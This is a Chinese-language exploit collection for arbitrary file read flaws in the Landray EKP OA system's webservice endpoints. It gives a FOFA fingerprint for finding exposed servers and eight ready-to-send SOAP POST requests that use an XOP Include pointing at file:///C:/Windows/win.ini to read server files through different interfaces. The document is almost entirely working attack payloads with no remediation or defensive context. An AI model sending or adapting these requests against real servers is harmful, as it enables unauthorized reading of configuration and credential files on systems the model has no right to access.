# 蓝凌EKP系统任意文件读取漏洞集合

蓝凌OA webservice服务多处 接口存在任意文件读取漏洞

## fofa

```javascript
body="Com_Parameter"
```

## poc1

```javascript
POST /sys/webservice/sysTagWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getGroups>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getGroups>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

## poc2

```javascript
POST /sys/webservice/sysNotifyTodoWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.notify.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getTodoCount>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getTodoCount>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

## poc3

```javascript
POST /sys/webservice/kmImeetingBookWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getImeetingBookLists>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getImeetingBookLists>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

## poc4

```javascript
POST /sys/webservice/kmImeetingResWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.imeeting.km.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getKmimeetingResById>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getKmimeetingResById>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

## poc5

```javascript
POST /sys/webservice/loginWebserviceService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://sso.authentication.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getLoginSessionId>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getLoginSessionId>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

## poc6

```javascript
POST /sys/webservice/wechatWebserviceService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.wechat.third.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getAttachement>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getAttachement>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

## poc7

```javascript
POST /sys/webservice/sysNotifyTodoWebServiceEkpj HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://ekpj.webservice.notify.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getAllTodoId>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getAllTodoId>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

## poc8

```javascript
POST /sys/webservice/sysSynchroGetOrgWebService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
Connection: close
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
Accept-Encoding: gzip, deflate

------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://out.webservice.organization.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
    <web:getOrgStaffingLevelInfo>
        <arg0>
            <beginTimeStamp>a</beginTimeStamp>
            <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
        </arg0>
    </web:getOrgStaffingLevelInfo>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
```

![image-20241218111203883](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412181112007.png)